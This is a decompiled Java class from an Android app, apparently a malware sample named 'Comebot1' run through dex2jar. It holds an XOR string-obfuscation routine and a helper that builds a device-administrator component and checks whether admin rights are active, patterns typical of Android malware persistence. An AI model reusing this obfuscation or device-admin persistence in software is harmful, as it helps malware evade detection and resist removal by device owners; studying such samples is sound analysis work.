package anu_bispro.app;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;

public class c {
  private ComponentName a;
  
  private Context b;
  
  private DevicePolicyManager c;
  
  public c(Context paramContext) {
    this.b = paramContext;
    String str1 = (new StringBuilder()).insert(0, this.b.getPackageName()).append(d.a("^b1t")).toString();
    String str2 = this.b.getPackageName();
    this.c = (DevicePolicyManager)this.b.getSystemService(b.a("_CMOXCdVTJREB"));
    this.a = new ComponentName(str2, str1);
  }
  
  public static String a(String paramString) {
    int i = paramString.length();
    char[] arrayOfChar = new char[i];
    int j = i - 1;
    i = j;
    while (j >= 0) {
      j = paramString.charAt(i);
      int k = i - 1;
      arrayOfChar[i] = (char)(char)(j ^ 0xD);
      if (k >= 0) {
        j = k - 1;
        arrayOfChar[k] = (char)(char)(paramString.charAt(k) ^ 0x66);
        i = j;
      } 
    } 
    return new String(arrayOfChar);
  }
  
  public ComponentName a() {
    return this.a;
  }
  
  public boolean b() {
    return this.c.isAdminActive(this.a);
  }
}


/* Location:              /home/fahim/Desktop/Comebot1-dex2jar.jar!/anu_bispro/app/c.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */